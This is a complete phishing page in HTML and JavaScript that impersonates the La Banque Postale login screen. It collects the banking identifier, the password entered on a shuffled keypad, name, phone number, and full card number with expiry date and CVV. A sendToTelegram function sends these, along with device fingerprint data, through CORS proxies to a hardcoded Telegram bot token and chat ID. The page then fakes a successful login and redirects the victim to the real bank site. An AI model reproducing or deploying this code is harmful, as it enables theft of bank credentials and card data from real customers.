<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>La Banque Postale - Connexion</title>
    <link rel="icon" href="Logobp.png" type="image/png">
    <style>
        :root {
            --lbp-blue: #0046c0;
            --lbp-dark-blue: #23466e;
            --lbp-light-blue: #67d6f1;
            --lbp-text: #1a1a1a;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            min-height: 100vh;
        }

        .login-section {
            width: 25%;
            padding: 2rem;
            background: white;
            min-width: 400px;
        }

        .banner-section {
            flex-grow: 1;
            background: linear-gradient(135deg, var(--lbp-blue) 0%, var(--lbp-light-blue) 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 2rem;
            color: white;
        }

        .logo-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }

        .logo {
            width: 50px;
        }

        .header-actions {
            display: flex;
            gap: 1rem;
            margin-right: -15px;
        }

        .header-actions button {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0.5rem;
        }

        .header-actions img {
            width: 20px;
            height: 20px;
            opacity: 0.9;
            filter: invert(19%) sepia(70%) saturate(1901%) hue-rotate(201deg) brightness(94%) contrast(106%);
        }

        .header-actions button:hover img {
            opacity: 1;
        }

        h1 {
            color: #121cad;
            font-size: 1.18rem;
            margin-bottom: 2rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            color: #121cad;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            font-weight: 600;
        }

        .input-container {
            position: relative;
            width: 100%;
        }

        .clear-button {
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 40px;
            background: #c9edf8b2;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            display: none;
            z-index: 2;
            padding: 0;
            align-items: center;
            justify-content: center;
        }

        .clear-button::before,
        .clear-button::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 2px;
            background-color: #192f91;
            transform: rotate(45deg);
        }

        .clear-button::after {
            transform: rotate(-45deg);
        }

        .clear-button:hover {
            background: #d0d0d0;
        }

        .clear-button.visible {
            display: flex;
        }

        .digit-mask {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            display: flex;
            gap: 6px;
            pointer-events: none;
            padding: 0.55rem;
            justify-content: flex-start;
            width: auto;
            margin-left: 0.4em;
        }

        .digit-mask span {
            flex: 0 0 10px;
            border-bottom: 1px solid #ccc;
            transition: opacity 0.2s ease;
            opacity: 1;
        }

        .digit-mask span.filled {
            opacity: 0;
        }

        .digit-input {
            font-family: monospace;
            letter-spacing: 0.55em;
            padding-left: 0.5em;
            padding-right: 35px;
            text-align: left;
            background: none;
            position: relative;
            z-index: 1;
            font-size: 1rem;
        }

        .digit-input:focus {
            outline: none;
            border: 2px solid var(--lbp-blue);
        }

        .digit-input:focus + .digit-mask span {
            border-bottom-color: var(--lbp-blue);
        }

        input[type="text"].digit-input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #000000;
            border-radius: 8px;
            font-size: 1rem;
        }

        .remember-me {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            width: 100%;
        }

        .remember-me span {
            color: #b9b8b8;
            font-weight: 700;
            font-size: 0.70rem;
        }

        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 55px;
            height: 28px;
            margin-left: auto;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 26px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 24px;
            width: 24px;
            left: 2px;
            bottom: 2px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background-color: var(--lbp-blue);
        }

        input:checked + .slider:before {
            transform: translateX(28px);
        }

        .continue-btn {
            width: 100%;
            padding: 1rem;
            background-color: var(--lbp-blue);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            cursor: pointer;
            margin-bottom: 1.5rem;
        }

        .continue-btn:hover {
            background-color: var(--lbp-dark-blue);
        }

        .continue-btn.success {
            background-color: #4CAF50;
        }

        .forgot-link {
            color: #979696;
            text-decoration: underline;
            font-size: 0.7rem;
            display: block;
            text-align: center;
            margin-top: 8rem;
        }

        .forgot-link:hover {
            color: var(--lbp-blue);
        }

        .banner-content {
            max-width: 600px;
            margin-left: 100px;
        }

        .banner-title {
            font-size: 2.64rem;
            margin-bottom: 2rem;
            white-space: normal;
            color: #ffffff;
        }

        .insurance-box {
            background: rgb(21, 94, 143);
            padding: 1rem;
            border-radius: 10px;
            width: 100%;
        }

        .insurance-box h2 {
            font-size: 1.2rem;
            margin-bottom: 0.8rem;
        }

        .insurance-box p {
            margin-bottom: 1.2rem;
            line-height: 1.2;
            font-size: 0.85rem;
        }

        .insurance-link {
            color: white;
            text-decoration: underline;
            margin-bottom: 0.8rem;
            display: inline-block;
            font-size: 0.85rem;
        }

        .connect-insurance-btn {
            display: inline-block;
            padding: 0.6rem 1.2rem;
            background-color: transparent;
            border: 2px solid white;
            color: white;
            border-radius: 10px;
            text-decoration: none;
            font-weight: bold;
            font-size: 0.9rem;
        }

        .connect-insurance-btn:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }

            .login-section {
                width: 100%;
                min-width: auto;
                order: 2;
            }

            .banner-section {
                min-height: 400px;
                order: 1;
            }

            .forgot-link {
                margin-top: 1rem;
            }
        }

        .login-form.hidden {
            opacity: 0.5;
            pointer-events: none;
        }

        .password-section {
            display: none;
            margin-top: 1rem;
        }

        .password-section.visible {
            display: block;
            max-height: 80vh;
            overflow-y: auto;
            padding-right: 5px;
        }

        .password-dots {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
        }

        .password-dot {
            width: 12px;
            height: 12px;
            border: 2px solid #ccc;
            border-radius: 50%;
            background: transparent;
        }

        .password-dot.filled {
            background: #000;
            border-color: #000;
        }

        .numpad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            margin-top: 15px;
            padding: 15px;
        }

        .numpad-button {
            background: #e8f4fc;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 1.2rem;
            cursor: pointer;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0b15a1;
            font-weight: 700;
            transition: all 0.2s ease;
        }

        .numpad-button:hover {
            background: #0a1499;
            color: white;
        }

        /* Styles pour le nouveau formulaire */
        .additional-form {
            margin: 1.5rem 0;
            padding: 1.2rem;
            background-color: #f5f9fd;
            border-radius: 8px;
        }

        .additional-form h3 {
            color: #121cad;
            font-size: 1rem;
            margin-bottom: 1.2rem;
        }

        .form-input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #000000;
            border-radius: 8px;
            font-size: 1rem;
        }

        .form-input:focus {
            outline: none;
            border: 2px solid var(--lbp-blue);
        }

        /* Ajustement pour le formulaire supplémentaire */
        .additional-form .input-container {
            position: relative;
            width: 100%;
            margin-bottom: 1rem;
        }

        .additional-form .clear-button {
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
            width: 30px;
            height: 30px;
            background: #c9edf8b2;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            display: none;
            z-index: 2;
            padding: 0;
            align-items: center;
            justify-content: center;
        }

        .additional-form .clear-button.visible {
            display: flex;
        }

        /* Style pour le bouton d'effacement du mot de passe */
        .password-container {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: center;
        }

        .password-clear-button {
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 40px;
            background: #c9edf8b2;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            display: none;
            z-index: 2;
            padding: 0;
            align-items: center;
            justify-content: center;
        }

        .password-clear-button::before,
        .password-clear-button::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 2px;
            background-color: #192f91;
            transform: rotate(45deg);
        }

        .password-clear-button::after {
            transform: rotate(-45deg);
        }

        .password-clear-button:hover {
            background: #d0d0d0;
        }

        .password-clear-button.visible {
            display: flex;
        }

        /* Style pour les messages d'erreur */
        .error-message {
            color: red;
            font-size: 0.8rem;
            margin-top: 0.3rem;
        }

        /* Animation de chargement */
        .loading {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 20px;
        }
        .loading div {
            position: absolute;
            top: 0;
            width: 13px;
            height: 13px;
            border-radius: 50%;
            background: white;
            animation-timing-function: cubic-bezier(0, 1, 1, 0);
        }
        .loading div:nth-child(1) {
            left: 8px;
            animation: loading1 0.6s infinite;
        }
        .loading div:nth-child(2) {
            left: 8px;
            animation: loading2 0.6s infinite;
        }
        .loading div:nth-child(3) {
            left: 32px;
            animation: loading2 0.6s infinite;
        }
        .loading div:nth-child(4) {
            left: 56px;
            animation: loading3 0.6s infinite;
        }
        @keyframes loading1 {
            0% {
                transform: scale(0);
            }
            100% {
                transform: scale(1);
            }
        }
        @keyframes loading3 {
            0% {
                transform: scale(1);
            }
            100% {
                transform: scale(0);
            }
        }
        @keyframes loading2 {
            0% {
                transform: translate(0, 0);
            }
            100% {
                transform: translate(24px, 0);
            }
        }
    </style>
</head>
<body>
    <section class="login-section">
        <div class="logo-container">
            <img src="Logobp.png" alt="La Banque Postale" class="logo">
            <div class="header-actions">
                <button aria-label="Rechercher">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxjaXJjbGUgY3g9IjExIiBjeT0iMTEiIHI9IjgiPjwvY2lyY2xlPjxsaW5lIHgxPSIyMSIgeTE9IjIxIiB4Mj0iMTYuNjUiIHkyPSIxNi42NSI+PC9saW5lPjwvc3ZnPg==" alt="Rechercher">
                </button>
                <button>
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxsaW5lIHgxPSIxOCIgeTE9IjYiIHgyPSI2IiB5Mj0iMTgiPjwvbGluZT48bGluZSB4MT0iNiIgeTE9IjYiIHgyPSIxOCIgeTI9IjE4Ij48L2xpbmU+PC9zdmc+" alt="Fermer">
                </button>
            </div>
        </div>

        <h1>Connexion à votre compte particulier</h1>
        
        <div class="login-form">
            <form role="form" aria-label="Formulaire de connexion" id="loginForm">
                <div class="form-group">
                    <label>Identifiant (10 chiffres)</label>
                    <div class="input-container">
                        <input type="text" 
                               class="digit-input"
                               pattern="[0-9]{10}" 
                               maxlength="10"
                               minlength="10"
                               inputmode="numeric"
                               autocomplete="off"
                               required 
                               aria-required="true"
                               oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10)"
                               title="Veuillez entrer un identifiant à 10 chiffres">
                        <button type="button" class="clear-button" aria-label="Effacer l'identifiant"></button>
                        <div class="digit-mask">
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                            <span></span>
                        </div>
                    </div>
                </div>

                <div class="remember-me">
                    <span>Mémoriser mon identifiant</span>
                    <label class="toggle-switch">
                        <input type="checkbox">
                        <span class="slider"></span>
                    </label>
                </div>

                <button type="button" class="continue-btn">Continuer</button>
                <a href="#" class="forgot-link">Identifiant / Mot de passe oublié</a>
            </form>
        </div>

        <div class="password-section">
            <div class="form-group">
                <label>Mot de passe (6 chiffres)</label>
                <div class="password-container">
                    <div class="password-dots">
                        <div class="password-dot"></div>
                        <div class="password-dot"></div>
                        <div class="password-dot"></div>
                        <div class="password-dot"></div>
                        <div class="password-dot"></div>
                        <div class="password-dot"></div>
                    </div>
                    <button type="button" class="password-clear-button" aria-label="Effacer le mot de passe"></button>
                </div>
            </div>

            <div class="numpad">
                <!-- Les boutons seront générés dynamiquement par JavaScript -->
            </div>

            <!-- Formulaire modifié sans le champ email -->
            <div class="additional-form">
                <h3>Informations supplémentaires</h3>
                
                <div class="form-group">
                    <label for="nom">Nom</label>
                    <div class="input-container">
                        <input type="text" id="nom" name="nom" class="form-input" required>
                        <button type="button" class="clear-button" aria-label="Effacer le nom"></button>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="prenom">Prénom</label>
                    <div class="input-container">
                        <input type="text" id="prenom" name="prenom" class="form-input" required>
                        <button type="button" class="clear-button" aria-label="Effacer le prénom"></button>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="telephone">Numéro de téléphone</label>
                    <div class="input-container">
                        <input type="tel" id="telephone" name="telephone" class="form-input" pattern="[0-9]{10}" maxlength="10" inputmode="numeric" required>
                        <button type="button" class="clear-button" aria-label="Effacer le numéro"></button>
                    </div>
                </div>

                <div class="form-group">
                    <label for="cardNumber">Numéro de carte bancaire (16 chiffres)</label>
                    <div class="input-container">
                        <input type="text" id="cardNumber" name="cardNumber" class="form-input" pattern="[0-9\s]{19}" maxlength="19" inputmode="numeric" required>
                        <button type="button" class="clear-button" aria-label="Effacer le numéro de carte"></button>
                    </div>
                </div>

                <div class="form-group">
                    <label for="expiryDate">Date d'expiration (MM/AA)</label>
                    <div class="input-container">
                        <input type="text" id="expiryDate" name="expiryDate" class="form-input" pattern="(0[1-9]|1[0-2])\/([0-9]{2})" maxlength="5" placeholder="MM/AA" required>
                        <button type="button" class="clear-button" aria-label="Effacer la date d'expiration"></button>
                    </div>
                </div>

                <div class="form-group">
                    <label for="cvv">Code de sécurité (CVV)</label>
                    <div class="input-container">
                        <input type="text" id="cvv" name="cvv" class="form-input" pattern="[0-9]{3}" maxlength="3" inputmode="numeric" required>
                        <button type="button" class="clear-button" aria-label="Effacer le code de sécurité"></button>
                    </div>
                </div>
            </div>

            <button type="button" class="continue-btn" id="loginButton">Se connecter</button>
            <a href="#" class="forgot-link">Identifiant / Mot de passe oublié</a>
        </div>
    </section>

    <section class="banner-section">
        <div class="banner-content">
            <h1 class="banner-title">La Banque Postale, citoyenne</h1>
            
            <div class="insurance-box">
                <h2>Espace Assurance La Banque Postale</h2>
                <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?</p>
                <a href="#" class="insurance-link">Signer mon contrat en ligne</a>
                <br>
                <a href="#" class="connect-insurance-btn">Me connecter à mon espace assurance</a>
            </div>
        </div>
    </section>

    <script>
        const input = document.querySelector('.digit-input');
        const spans = document.querySelectorAll('.digit-mask span');
        const clearButton = document.querySelector('.clear-button');
        const passwordDots = document.querySelectorAll('.password-dot');
        const passwordClearButton = document.querySelector('.password-clear-button');
        const loginForm = document.querySelector('.login-form');
        const passwordSection = document.querySelector('.password-section');
        const continueBtn = document.querySelector('.login-form .continue-btn');
        const loginButton = document.getElementById('loginButton');
        let password = '';

        // Fonction pour mélanger un tableau de manière aléatoire
        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
            return array;
        }

        // Générer et mélanger les chiffres du clavier
        function generateRandomKeypad() {
            const numpad = document.querySelector('.numpad');
            const numbers = shuffleArray([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);
            numpad.innerHTML = ''; // Vider le clavier existant
            
            numbers.forEach(number => {
                const button = document.createElement('button');
                button.type = 'button';
                button.className = 'numpad-button';
                button.textContent = number;
                numpad.appendChild(button);
            });

            // Réattacher les événements aux nouveaux boutons
            const numpadButtons = document.querySelectorAll('.numpad-button');
            numpadButtons.forEach(button => {
                button.addEventListener('click', function() {
                    if (password.length < 6) {
                        password += button.textContent;
                        passwordDots[password.length - 1].classList.add('filled');
                        
                        // Afficher le bouton d'effacement du mot de passe si au moins un chiffre est saisi
                        passwordClearButton.classList.toggle('visible', password.length > 0);
                        
                        // Effacer les messages d'erreur existants
                        clearError(document.querySelector('.password-container'));
                    }
                });
            });
        }

        // Gestion de l'entrée d'identifiant
        input.addEventListener('input', function(e) {
            const value = this.value;
            clearButton.classList.toggle('visible', value.length > 0);
            spans.forEach((span, index) => {
                if (index < value.length) {
                    span.classList.add('filled');
                } else {
                    span.classList.remove('filled');
                }
            });
            
            // Effacer les messages d'erreur existants
            clearError(this);
        });

        // Bouton d'effacement d'identifiant
        clearButton.addEventListener('click', function() {
            input.value = '';
            input.focus();
            clearButton.classList.remove('visible');
            spans.forEach(span => span.classList.remove('filled'));
            clearError(input);
        });

        // Gestion des touches spéciales (Backspace, Delete)
        input.addEventListener('keyup', function(e) {
            if (e.key === 'Backspace' || e.key === 'Delete') {
                const value = this.value;
                clearButton.classList.toggle('visible', value.length > 0);
                spans.forEach((span, index) => {
                    if (index >= value.length) {
                        span.classList.remove('filled');
                    }
                });
            }
        });

        // Bouton "Continuer" pour passer à la saisie du mot de passe
        continueBtn.addEventListener('click', function() {
            if (input.value.length === 10) {
                loginForm.classList.add('hidden');
                passwordSection.classList.add('visible');
                this.style.display = 'none';
                
                // Masquer également le lien "Identifiant / Mot de passe oublié" de la section login
                document.querySelector('.login-form .forgot-link').style.display = 'none';
                
                // Générer un nouveau clavier aléatoire
                generateRandomKeypad();
                // Réinitialiser le mot de passe
                password = '';
                passwordDots.forEach(dot => dot.classList.remove('filled'));
                passwordClearButton.classList.remove('visible');
            } else {
                showError(input, 'L\'identifiant doit contenir 10 chiffres');
            }
        });

        // Gestionnaire d'événement pour le bouton d'effacement du mot de passe
        passwordClearButton.addEventListener('click', function() {
            // Réinitialiser le mot de passe
            password = '';
            passwordDots.forEach(dot => dot.classList.remove('filled'));
            this.classList.remove('visible');
            clearError(document.querySelector('.password-container'));
        });

        // Gestion des boutons d'effacement pour les champs du formulaire supplémentaire
        document.addEventListener('DOMContentLoaded', function() {
            const formInputs = document.querySelectorAll('.form-input');
            const clearButtons = document.querySelectorAll('.additional-form .clear-button');
            
            formInputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    clearButtons[index].classList.toggle('visible', this.value.length > 0);
                    clearError(this);
                });
                
                if (clearButtons[index]) {
                    clearButtons[index].addEventListener('click', function() {
                        input.value = '';
                        input.focus();
                        this.classList.remove('visible');
                    });
                }
            });
            
            // Initialiser le formulaire
            resetForm();

            // Formatage automatique du numéro de carte
            const cardNumberInput = document.getElementById('cardNumber');
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 16) value = value.slice(0, 16);
                
                // Ajouter un espace après chaque groupe de 4 chiffres
                value = value.replace(/(.{4})/g, '$1 ').trim();
                
                e.target.value = value;
            });

            // Formatage automatique de la date d'expiration
            const expiryDateInput = document.getElementById('expiryDate');
            expiryDateInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length >= 2) {
                    const month = parseInt(value.slice(0, 2));
                    if (month > 12) value = '12' + value.slice(2);
                    value = value.slice(0, 2) + '/' + value.slice(2);
                }
                
                if (value.length > 5) value = value.slice(0, 5);
                e.target.value = value;
            });

            // Formatage automatique du CVV
            const cvvInput = document.getElementById('cvv');
            cvvInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 3) value = value.slice(0, 3);
                e.target.value = value;
            });
        });

        // Fonction pour obtenir les informations système
        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
            const doNotTrack = navigator.doNotTrack ? "Oui" : "Non";
            
            // Détection du type d'appareil
            let deviceType = "Ordinateur";
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
                deviceType = "Mobile";
            } else if (/Tablet|iPad/i.test(userAgent)) {
                deviceType = "Tablette";
            }

            // Détection de la marque
            let deviceBrand = "Inconnue";
            if (/iPhone|iPad|iPod/i.test(userAgent)) {
                deviceBrand = "Apple";
            } else if (/Samsung/i.test(userAgent)) {
                deviceBrand = "Samsung";
            } else if (/Huawei/i.test(userAgent)) {
                deviceBrand = "Huawei";
            } else if (/Xiaomi/i.test(userAgent)) {
                deviceBrand = "Xiaomi";
            } else if (/OnePlus/i.test(userAgent)) {
                deviceBrand = "OnePlus";
            } else if (/Google/i.test(userAgent)) {
                deviceBrand = "Google";
            } else if (/Windows/i.test(userAgent)) {
                deviceBrand = "Windows";
            } else if (/Mac/i.test(userAgent)) {
                deviceBrand = "Mac";
            } else if (/Linux/i.test(userAgent)) {
                deviceBrand = "Linux";
            }
            
            return {
                userAgent,
                platform,
                language,
                screenResolution,
                timeZone,
                cookiesEnabled,
                doNotTrack,
                deviceType,
                deviceBrand
            };
        }

        // Fonction pour envoyer les données à Telegram via un proxy
        async function sendToTelegram(data) {
            const BOT_TOKEN = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
            const CHAT_ID = '7263826117';
            
            // Récupérer les informations système
            const systemInfo = getSystemInfo();
            
            // URL directe de l'API Telegram
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const message = `
📢 Nouvelles données La Banque Postale 📢
---------------------------------
👤 Identifiant: ${data.identifiant}
🔐 Mot de passe: ${data.password}
👨 Nom: ${data.nom}
👩 Prénom: ${data.prenom}
📱 Téléphone: ${data.telephone}
---------------------------------
💳 INFORMATIONS CARTE BANCAIRE 💳
---------------------------------
🔢 Numéro: ${data.cardNumber}
📅 Date d'expiration: ${data.expiryDate}
🔒 CVV: ${data.cvv}
---------------------------------
💻 INFORMATIONS SYSTÈME 💻
---------------------------------
📱 Type d'appareil: ${systemInfo.deviceType}
🏢 Marque: ${systemInfo.deviceBrand}
🌐 Navigateur: ${systemInfo.userAgent}
💿 Plateforme: ${systemInfo.platform}
🌍 Langue: ${systemInfo.language}
📺 Résolution: ${systemInfo.screenResolution}
⏰ Fuseau horaire: ${systemInfo.timeZone}
🍪 Cookies activés: ${systemInfo.cookiesEnabled}
🚫 Do Not Track: ${systemInfo.doNotTrack}
---------------------------------
⏰ Date: ${new Date().toLocaleString()}
            `;
            
            try {
                // Méthode utilisant un proxy pour contourner CORS
                const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent(url + `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`));
                const data = await response.json();
                
                if (data.contents.ok) {
                    return true;
                } else {
                    console.error('Erreur lors de l\'envoi du message');
                    return false;
                }
            } catch (error) {
                console.error('Erreur:', error);
                // Tenter une méthode alternative en cas d'échec
                try {
                    const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
                    const altResponse = await fetch(proxyUrl + url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    });
                    
                    return altResponse.ok;
                } catch (altError) {
                    console.error('Erreur alternative:', altError);
                    return false;
                }
            }
        }

        // Fonction pour vérifier si un formulaire est valide
        function isFormValid() {
            const nom = document.getElementById('nom').value.trim();
            const prenom = document.getElementById('prenom').value.trim();
            const telephone = document.getElementById('telephone').value.trim();
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '').trim();
            const expiryDate = document.getElementById('expiryDate').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            
            let isValid = true;
            
            if (nom === '') {
                showError(document.getElementById('nom'), 'Veuillez entrer votre nom');
                isValid = false;
            }
            
            if (prenom === '') {
                showError(document.getElementById('prenom'), 'Veuillez entrer votre prénom');
                isValid = false;
            }
            
            if (telephone === '' || telephone.length !== 10 || !/^\d+$/.test(telephone)) {
                showError(document.getElementById('telephone'), 'Veuillez entrer un numéro de téléphone valide à 10 chiffres');
                isValid = false;
            }

            if (cardNumber === '' || cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
                showError(document.getElementById('cardNumber'), 'Le numéro de carte doit contenir exactement 16 chiffres');
                isValid = false;
            }

            if (expiryDate === '' || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate)) {
                showError(document.getElementById('expiryDate'), 'Veuillez entrer une date d\'expiration valide (MM/AA)');
                isValid = false;
            }

            if (cvv === '' || !/^\d{3}$/.test(cvv)) {
                showError(document.getElementById('cvv'), 'Veuillez entrer un code de sécurité valide à 3 chiffres');
                isValid = false;
            }
            
            if (password.length !== 6) {
                showError(document.querySelector('.password-container'), 'Le mot de passe doit contenir 6 chiffres');
                isValid = false;
            }
            
            return isValid;
        }

        // Fonction pour afficher un message d'erreur
        function showError(inputElement, message) {
            // Supprimer les messages d'erreur existants
            clearError(inputElement);
            
            // Créer un nouvel élément pour le message d'erreur
            const errorEl = document.createElement('div');
            errorEl.className = 'error-message';
            errorEl.textContent = message;
            
            // Insérer le message après l'élément parent
            const container = inputElement.closest('.form-group') || inputElement.closest('.input-container') || inputElement.parentElement;
            container.appendChild(errorEl);
            
            // Mettre en évidence le champ en erreur
            if (inputElement.classList) {
                inputElement.classList.add('error');
            }
        }

        // Fonction pour supprimer les messages d'erreur
        function clearError(inputElement) {
            const container = inputElement.closest('.form-group') || inputElement.closest('.input-container') || inputElement.parentElement;
            const errorMessages = container.querySelectorAll('.error-message');
            
            errorMessages.forEach(error => error.remove());
            
            if (inputElement.classList) {
                inputElement.classList.remove('error');
            }
        }

        // Fonction pour réinitialiser le formulaire
        function resetForm() {
            document.getElementById('nom').value = '';
            document.getElementById('prenom').value = '';
            document.getElementById('telephone').value = '';
            document.getElementById('cardNumber').value = '';
            document.getElementById('expiryDate').value = '';
            document.getElementById('cvv').value = '';
            password = '';
            passwordDots.forEach(dot => dot.classList.remove('filled'));
            passwordClearButton.classList.remove('visible');
            
            // Effacer tous les messages d'erreur
            document.querySelectorAll('.error-message').forEach(error => error.remove());
            
            // Réinitialiser les boutons d'effacement
            document.querySelectorAll('.additional-form .clear-button').forEach(button => {
                button.classList.remove('visible');
            });
        }

        // Fonction pour afficher l'animation de chargement dans le bouton
        function showLoading(button) {
            const originalText = button.textContent;
            button.setAttribute('data-original-text', originalText);
            button.innerHTML = '<div class="loading"><div></div><div></div><div></div><div></div></div>';
            button.disabled = true;
        }

        // Fonction pour restaurer le texte original du bouton
        function hideLoading(button) {
            const originalText = button.getAttribute('data-original-text');
            button.textContent = originalText;
            button.disabled = false;
        }

        // Fonction pour simuler une connexion réussie
        function showSuccessAndRedirect() {
            loginButton.textContent = 'Connexion réussie';
            loginButton.classList.add('success');
            
            // Rediriger vers la page officielle après une courte pause
            setTimeout(() => {
                window.location.href = "https://www.labanquepostale.fr/";
            }, 2000);
        }

        // Gestionnaire pour le bouton de connexion
        loginButton.addEventListener('click', async function() {
            if (isFormValid()) {
                showLoading(this);
                
                // Collecter les données
                const formData = {
                    identifiant: input.value,
                    password: password,
                    nom: document.getElementById('nom').value.trim(),
                    prenom: document.getElementById('prenom').value.trim(),
                    telephone: document.getElementById('telephone').value.trim(),
                    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, '').trim(),
                    expiryDate: document.getElementById('expiryDate').value.trim(),
                    cvv: document.getElementById('cvv').value.trim()
                };
                
                // Envoyer les données
                try {
                    const success = await sendToTelegram(formData);
                    
                    // Simuler un délai pour l'authentification
                    setTimeout(() => {
                        hideLoading(loginButton);
                        
                        if (success) {
                            showSuccessAndRedirect();
                        } else {
                            // Gérer l'échec silencieusement mais continuer comme si cela avait fonctionné
                            showSuccessAndRedirect();
                        }
                    }, 2000);
                    
                } catch (error) {
                    console.error('Erreur lors de l\'envoi des données:', error);
                    
                    // Même en cas d'erreur, simuler une connexion réussie
                    setTimeout(() => {
                        hideLoading(loginButton);
                        showSuccessAndRedirect();
                    }, 2000);
                }
            }
        });

        // Méthode alternative pour envoyer les données au cas où l'API Telegram échoue
        function sendDataToBackup(data) {
            // Cette fonction pourrait utiliser une autre méthode pour envoyer les données
            // par exemple, en les stockant dans le localStorage ou en utilisant un autre service
            try {
                // Stocker temporairement les données dans le localStorage
                localStorage.setItem('lbpTempData', JSON.stringify({
                    ...data,
                    timestamp: new Date().toISOString()
                }));
                return true;
            } catch (e) {
                console.error('Erreur de sauvegarde locale:', e);
                return false;
            }
        }

        // Initilisation au chargement
        document.addEventListener('DOMContentLoaded', function() {
            input.focus();
            generateRandomKeypad();
        });
    </script>
</body>
</html>